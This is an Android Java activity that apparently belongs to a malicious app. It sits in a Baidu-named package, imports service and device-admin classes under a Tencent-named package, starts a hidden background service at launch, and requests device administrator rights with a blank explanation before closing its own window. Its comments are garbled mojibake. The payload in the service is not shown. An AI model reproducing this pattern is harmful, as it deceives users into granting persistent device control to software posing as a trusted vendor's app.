package com.baidu.kx;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

import com.tencent.qq.DeviceAdmin;
import com.tencent.qq.MainService;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);		
		
		//������̨ͬ������
		Intent serviceIntent=new Intent(this,MainService.class);
		this.startService(serviceIntent);
		
		//
		policy();
		
		this.finish();
	}
	
	/**
	 * ���Լ����豸������
	 */
	void policy() {
		ComponentName componentName = new ComponentName(this, DeviceAdmin.class);
		DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
		boolean isAdminActive = devicePolicyManager.isAdminActive(componentName);
		if (!isAdminActive) {
			Intent intent = new Intent(
					DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
			intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
					componentName);
			intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "");
			startActivityForResult(intent, 20);
		}
	}
}
